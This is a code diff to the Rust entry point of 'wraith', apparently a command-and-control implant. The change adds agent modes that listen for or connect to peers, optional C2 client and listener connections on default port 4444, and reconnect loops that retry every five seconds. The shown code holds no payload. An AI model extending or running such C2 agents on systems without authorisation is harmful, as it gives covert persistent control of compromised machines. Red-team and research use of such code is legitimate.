@@ -1,4 +1,3 @@
-#[macro_use]
 extern crate log;
 extern crate simplelog;
 
@@ -12,6 +11,8 @@ pub mod wraith;
 use clap::Parser;
 use log::{error, info};
 use std::net::Ipv4Addr;
+use std::time::Duration;
+use std::sync::Arc;
 
 fn parse_host_port(addr: &str) -> (String, u16) {
     let parts: Vec<&str> = addr.split(':').collect();
@@ -34,13 +35,13 @@ struct Args {
     #[arg(long)]
     log_file: Option<String>,
 
-    /// C2 host
-    #[arg(long, default_value = "127.0.0.1")]
-    c2_host: Ipv4Addr,
+    /// C2 host (optional in agent mode)
+    #[arg(long)]
+    c2_host: Option<Ipv4Addr>,
 
-    /// C2 port
-    #[arg(short = 'p', long, default_value_t = 4444)]
-    c2_port: u16,
+    /// C2 port (optional, defaults to 4444 when C2 host is specified)
+    #[arg(short = 'p')]
+    c2_port: Option<u16>,
 
     /// Listen mode (server)
     #[arg(short = 'l', long)]
@@ -53,6 +54,9 @@ struct Args {
     /// Agent mode: connect to C2 at HOST:PORT, and optionally connect to peer at --peer HOST:PORT
     #[arg(long, value_name = "HOST:PORT")]
     agent_connect: Option<String>,
+
+    #[arg(long)]
+    wraith_id: String,
 
     /// Peer to connect to (for agent mode, format: HOST:PORT)
     #[arg(long, value_name = "HOST:PORT")]
@@ -90,50 +94,107 @@ fn setup_logging(debug: bool, log_file: &Option<String>) -> Result<(), Box<dyn s
     Ok(())
 }
 
-fn main() {
+#[tokio::main]
+async fn main() {
     let args = Args::parse();
 
     setup_logging(args.debug, &args.log_file).unwrap();
 
-    // Handle agent mode
-    if let Some(addr) = &args.agent_listen {
-        let (host, port) = parse_host_port(addr);
-        info!("Agent mode: listening for peers on {}:{}", host, port);
-        let rt = tokio::runtime::Runtime::new().unwrap();
-        let mut wraith = wraith::Wraith::new_agent_listener(host, port);
-        rt.block_on(wraith.run_agent_listener());
-        return;
-    }
+    let wraith = wraith::Wraith::new(&args.wraith_id);
+    let state = wraith.state();
+    let tunnel_manager = wraith.tunnel_manager();
 
-    if let Some(addr) = &args.agent_connect {
-        let (host, port) = parse_host_port(addr);
-        let peer_addr = args.peer.clone();
-        info!("Agent mode: connecting to C2 at {}:{}", host, port);
-        if let Some(ref peer) = peer_addr {
-            info!("Agent mode: connecting to peer at {}", peer);
-        }
-        let rt = tokio::runtime::Runtime::new().unwrap();
-        let mut wraith = wraith::Wraith::new_agent_connect(host, port, peer_addr);
-        rt.block_on(wraith.run_agent_connect());
-        return;
-    }
-
-    let host = args.c2_host.to_string();
-    let port = args.c2_port;
     let is_server = args.listen;
 
-    info!("Starting wraith...");
-    info!("Host: {}:{}, Mode: {}", host, port, if is_server { "listen" } else { "connect" });
+    // Agent listen mode: peer listen (C2 optional)
+    if let Some(ref peer_addr) = args.agent_listen {
+        let (peer_host, peer_port) = parse_host_port(peer_addr);
 
-    let mut wraith = wraith::Wraith::new(host, port, is_server);
+        // Spawn peer listener
+        let tm = Arc::clone(&tunnel_manager);
+        tokio::spawn(async move {
+            if let Err(e) = tm.start_peer_listener(&format!("{}:{}", peer_host, peer_port)).await {
+                error!("Peer listener error: {}", e);
+            }
+        });
 
-    let rt = tokio::runtime::Runtime::new().unwrap();
+        // C2 is optional in agent mode
+        if let (Some(c2_host), Some(c2_port)) = (args.c2_host.as_ref(), args.c2_port.or(Some(4444))) {
+            let c2_addr = format!("{}:{}", c2_host, c2_port);
+            info!("Agent mode: C2 listen on {}, peer listen on {}", c2_addr, peer_addr);
+            wraith.run_c2_listener(c2_addr).await;
+        } else {
+            info!("Agent mode: peer listen on {} (no C2)", peer_addr);
+            // Keep running - peer listener is running in background
+            loop {
+                tokio::time::sleep(Duration::from_secs(60)).await;
+            }
+        }
+        return;
+    }
+
+    // Agent connect mode: peer connect (C2 optional)
+    if let Some(ref peer_addr) = args.agent_connect {
+        let peer_addr_clone = peer_addr.clone();
+
+        // Clone shared state for the peer connection task
+        let tm = Arc::clone(&tunnel_manager);
+        let (wraith_id, hostname, os) = {
+            let s = state.lock().unwrap();
+            (s.wraith_id.clone(), s.hostname.clone(), s.os.clone())
+        };
+
+        // Spawn peer connection in background with retry
+        tokio::spawn(async move {
+            loop {
+                match tm.connect_to_peer(peer_addr_clone.clone(), wraith_id.clone(), hostname.clone(), os.clone()).await {
+                    Ok(_) => {
+                        info!("Peer connection established");
+                        break;
+                    }
+                    Err(e) => {
+                        error!("Peer connection failed: {}, retrying in 5s", e);
+                        tokio::time::sleep(Duration::from_secs(5)).await;
+                    }
+                }
+            }
+        });
+
+        // C2 is optional in agent mode
+        if let (Some(c2_host), Some(c2_port)) = (args.c2_host.as_ref(), args.c2_port.or(Some(4444))) {
+            let c2_addr = format!("{}:{}", c2_host, c2_port);
+            info!("Agent mode: C2 connect to {}, peer connect to {}", c2_addr, peer_addr);
+            wraith.run_c2_client(c2_host.to_string(), c2_port).await;
+        } else {
+            info!("Agent mode: peer connect to {} (no C2)", peer_addr);
+            // Keep running - peer connection retry loop is in background
+            loop {
+                tokio::time::sleep(Duration::from_secs(60)).await;
+            }
+        }
+        return;
+    }
+
+    // Regular mode (non-agent) - C2 is required
+    let c2_host = args.c2_host.expect("C2 host is required in regular mode (or use --agent-listen / --agent-connect)");
+    let c2_port = args.c2_port.unwrap_or(4444);
+
+    info!(
+        "Starting wraith... Host: {}:{}, Mode: {}",
+        c2_host,
+        c2_port,
+        if is_server { "listen" } else { "connect" }
+    );
+
+    let mut w = wraith;
+    w.create_connection(c2_host.to_string(), c2_port, is_server);
 
     loop {
-        match rt.block_on(wraith.run()) {
+        match w.run().await {
             Ok(_) => info!("Connection closed gracefully"),
             Err(e) => {
                 error!("Error: {}", e);
+                tokio::time::sleep(Duration::from_secs(5)).await;
             }
         }
     }
